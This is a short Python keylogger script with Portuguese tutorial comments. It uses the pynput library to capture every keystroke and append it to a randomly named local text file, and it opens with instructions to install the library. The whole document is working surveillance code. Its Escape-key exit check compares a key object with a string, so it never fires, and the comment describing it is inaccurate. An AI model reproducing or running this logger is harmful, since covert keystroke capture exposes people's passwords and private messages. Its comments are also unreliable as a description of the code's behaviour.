"""
Instale a biblioteca pynput que permite controlar e monitorar entrada de dispositivos:
pip install pynput
"""

from pynput.keyboard import Listener
import sys
import random
 
numero_log = random.randint(0, 1000)            # Criamos a variável numero_log que recebe a função randomica de um número inteiro no range de 0 a 1000
log = f'yek{numero_log}.txt'                    # Criamos o log que recebe a variável numero_log formatada e em .txt
def escreve_key(key):                           # Criamos uma função escreve_key com def
    with open(f'{log}', 'a') as file:           # Abrimos a variável log formatada e como um arquivo
        file.write(f'{str(key)} \n')            # Escrevemos na string key formatada em cada linha
    if key == 'Key.esc':                        # Se key for igual a Key.asc então encerre o app.
        sys.exit()

with Listener (on_press=escreve_key) as logs:
    logs.join()
